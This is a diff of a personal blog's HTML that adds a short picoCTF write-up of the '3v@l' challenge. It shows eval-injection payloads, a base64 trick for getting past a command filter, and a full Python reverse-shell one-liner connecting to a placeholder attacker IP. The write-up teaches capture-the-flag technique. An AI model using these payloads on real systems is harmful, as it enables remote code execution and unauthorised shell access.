@@ -3,11 +3,11 @@
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title itemprop="name">Tags | Crong&#39;s Blog</title>
-<meta property="og:title" content="Tags | Crong&#39;s Blog" />
-<meta name="twitter:title" content="Tags | Crong&#39;s Blog" />
-<meta itemprop="name" content="Tags | Crong&#39;s Blog" />
-<meta name="application-name" content="Tags | Crong&#39;s Blog" />
+<title itemprop="name">3v@l - PicoCTF | Crong&#39;s Blog</title>
+<meta property="og:title" content="3v@l - PicoCTF | Crong&#39;s Blog" />
+<meta name="twitter:title" content="3v@l - PicoCTF | Crong&#39;s Blog" />
+<meta itemprop="name" content="3v@l - PicoCTF | Crong&#39;s Blog" />
+<meta name="application-name" content="3v@l - PicoCTF | Crong&#39;s Blog" />
 <meta property="og:site_name" content="" />
 
 <meta name="description" content="Datsuraku&#39;s blog">
@@ -18,7 +18,7 @@
 <meta property="og:locale" content="en-us" />
 <meta name="language" content="en-us" />
 
-  <link rel="alternate" hreflang="en" href="http://localhost:1313/tags/" title="" />
+  <link rel="alternate" hreflang="en" href="http://localhost:1313/timeline/3v@l/" title="" />
 
 
 
@@ -28,26 +28,34 @@
 <meta name="generator" content="Hugo 0.153.2">
 
     
-    <meta property="og:url" content="http://localhost:1313/tags/">
+    <meta property="og:url" content="http://localhost:1313/timeline/3v@l/">
   <meta property="og:site_name" content="Crong&#39;s Blog">
-  <meta property="og:title" content="Tags">
-  <meta property="og:description" content="Datsuraku&#39;s blog">
+  <meta property="og:title" content="3v@l - PicoCTF">
+  <meta property="og:description" content="Introduction Hello,
+This is going to be a super short writeup(because I have a work tomorrow T_T) for the 3v@l challenge on picoCTF. I actually didn’t have any plan to write about this challenge, but I think my solution is super silly and overkill, so might as well share hehe.
+I solved it by getting a reverse shell on the server T_T and I’m sure that’s not the intended solution.">
   <meta property="og:locale" content="en_us">
-  <meta property="og:type" content="website">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="timeline">
+    <meta property="article:published_time" content="2026-01-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-01-26T00:00:00+00:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Rce">
+    <meta property="article:tag" content="PicoCTF">
 
 
     
     
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Tags">
-  <meta name="twitter:description" content="Datsuraku&#39;s blog">
+  <meta name="twitter:title" content="3v@l - PicoCTF">
+  <meta name="twitter:description" content="Introduction Hello,
+This is going to be a super short writeup(because I have a work tomorrow T_T) for the 3v@l challenge on picoCTF. I actually didn’t have any plan to write about this challenge, but I think my solution is super silly and overkill, so might as well share hehe.
+I solved it by getting a reverse shell on the server T_T and I’m sure that’s not the intended solution.">
 
 
     
 
-    <link rel="canonical" href="http://localhost:1313/tags/">
-    <link href="/tags/index.xml" rel="alternate" type="application/rss+xml" title="Crong&#39;s Blog">
-    <link href="/tags/index.xml" rel="feed" type="application/rss+xml" title="Crong&#39;s Blog">
+    <link rel="canonical" href="http://localhost:1313/timeline/3v@l/">
     <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -108,14 +116,14 @@ stroke-linejoin="round" class="feather feather-home">
                 </li>
                 
                 <li>
-                    <a class="menu-link active" href="/tags/">
+                    <a class="menu-link " href="/tags/">
                         Tags
                     </a>
                     
                 </li>
                 
                 <li>
-                    <a class="menu-link " href="/timeline/">
+                    <a class="menu-link active" href="/timeline/">
                         Timeline
                     </a>
                     
@@ -143,184 +151,71 @@ stroke-linejoin="round" class="feather feather-home">
         </div>
     </nav>
 </div>
-<div class="wrapper list-page">
-    <header class="header">
-        <h1 class="header-title center">Tags</h1>
-    </header>
+
+<div class="wrapper post">
     <main class="page-content" aria-label="Content">
-        
-        
-        <h2 class="post-year">2026</h2>
+        <article>
+            <header class="header">
+                <h1 class="header-title">3v@l - PicoCTF</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-01-26T00:00:00&#43;00:00" itemprop="datePublished"> Jan 26, 2026 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#recon">Recon?</a></li>
+    <li><a href="#code-execution">Code Execution</a></li>
+    <li><a href="#flagtxt">Flag.txt</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="introduction">Introduction</h2>
+<p>Hello,</p>
+<p>This is going to be a super short writeup(because I have a work tomorrow T_T) for the <strong>3v@l</strong> challenge on <strong>picoCTF</strong>. I actually didn&rsquo;t have any plan to write about this challenge, but I think my solution is super silly and overkill, so might as well share hehe.</p>
+<p>I solved it by getting a <em>reverse shell</em> on the server T_T and I&rsquo;m sure that&rsquo;s not the <strong>intended</strong> solution.</p>
+<h2 id="recon">Recon?</h2>
+<blockquote>
+<p> Unfortunately, they are using an <code>eval</code> function to calculate the loan.</p>
+</blockquote>
+<p>The challenge description gives us a very good hint.</p>
+<p>Then, checking the challenge site&rsquo;s source reveals that our input is inside of python&rsquo;s <code>eval</code> function. Also, it implements a <strong>regex</strong> filter and blocks common used commands, such as <code>ls</code>, <code>os</code>, <code>exec</code>, <code>cat</code> etc&hellip;</p>
+<p><img src="/images/3v@l-0.png" alt="Image Description"></p>
+<h2 id="code-execution">Code Execution</h2>
+<p>After playing around with it, I was able to use the following payload to run commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;subprocess&#39;</span>)<span style="color:#f92672">.</span>getoutput(<span style="color:#e6db74">&#39;&lt;command&gt;&#39;</span>)
+</span></span></code></pre></div><p>I accessed <code>env</code> but the <code>flag</code> wasn&rsquo;t there :(</p>
+<p><img src="/images/3v@l-1.png" alt="Image Description"></p>
+<p>Next, I tried to bypass the filter&hellip;so instead of <code>ls</code> I used <code>dir</code>, instead of <code>cat</code> I used <code>tac</code> xD</p>
+<p>But&hellip;the <code>flag</code> wasn&rsquo;t in the current directory, and since I can&rsquo;t use <code>/</code> or <code>\</code> I wasn&rsquo;t able to access files in a different directory :(</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;subprocess&#39;</span>)<span style="color:#f92672">.</span>getoutput(<span style="color:#e6db74">&#39;tac *&#39;</span>)
+</span></span></code></pre></div><p><img src="/images/3v@l-2.png" alt="Image Description"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;subprocess&#39;</span>)<span style="color:#f92672">.</span>getoutput(<span style="color:#e6db74">&#39;dir /&#39;</span>) <span style="color:#75715e"># any usage of blocked characters/commands</span>
+</span></span></code></pre></div><p><img src="/images/3v@l-3.png" alt="Image Description"></p>
+<h2 id="flagtxt">Flag.txt</h2>
+<p>I was getting frustrated so, I decided to go with the easy route(it&rsquo;s getting late after all).</p>
+<p>Wallah&hellip;I figured I can just <code>base64</code> encode the commands I want to run, to bypass the filter, then decode them back to their original form, and finally pass them to <code>sh</code> to execute the commands.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;subprocess&#39;</span>)<span style="color:#f92672">.</span>getoutput(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;echo &lt;base64_encoded_commands&gt; | base64 -d | sh&#39;</span>)
+</span></span></code></pre></div><p>At this point, I really just want to solve this challenge :P so I went ahead and <code>base64</code> encoded a <strong>python3</strong> reverse shell payload from <a href="https://www.revshells.com/">https://www.revshells.com/</a> hahahahahaha.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>export RHOST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;MY_IP&gt;&#34;</span>;export RPORT<span style="color:#f92672">=&lt;</span>MY_PORT<span style="color:#f92672">&gt;</span>;python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;sh&#34;)&#39;</span>
+</span></span></code></pre></div><p>Finally, I entered the crafted payload, got a reverse shell, then looked for the <code>flag</code> lol.</p>
+<p><img src="/images/3v@l-4.png" alt="Image Description"></p>
+<p>This was a super fun challenge and it made me realize that <code>base64</code> encoding is useful to bypass some filters.</p>
+<p><em><strong>-Datsuraku147</strong></em></p>
 
-        
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/tags/web/">Web</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-01-26T00:00:00Z">
-        26 Jan 2026
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/tags/rce/">Rce</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-01-26T00:00:00Z">
-        26 Jan 2026
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/tags/picoctf/">PicoCTF</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-01-26T00:00:00Z">
-        26 Jan 2026
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/tags/racecondition/">Racecondition</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-01-15T00:00:00Z">
-        15 Jan 2026
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/tags/codereview/">Codereview</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-01-15T00:00:00Z">
-        15 Jan 2026
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/tags/graphql/">Graphql</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-01-10T00:00:00Z">
-        10 Jan 2026
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/tags/dojo/">Dojo</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-01-10T00:00:00Z">
-        10 Jan 2026
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/tags/ratelimiting/">Ratelimiting</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-01-01T00:00:00Z">
-        1 Jan 2026
-        
-    </time>
-</article>
-
-
-         
-
-        
-        
-        <h2 class="post-year">2025</h2>
-
-        
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/tags/ssti/">Ssti</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2025-02-11T00:00:00Z">
-        11 Feb 2025
-        
-    </time>
-</article>
-
-
-         
-
-         
-
-    </main>
-</div><footer class="footer">
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
     <span class="footer_item"> </span>
     &nbsp;
 
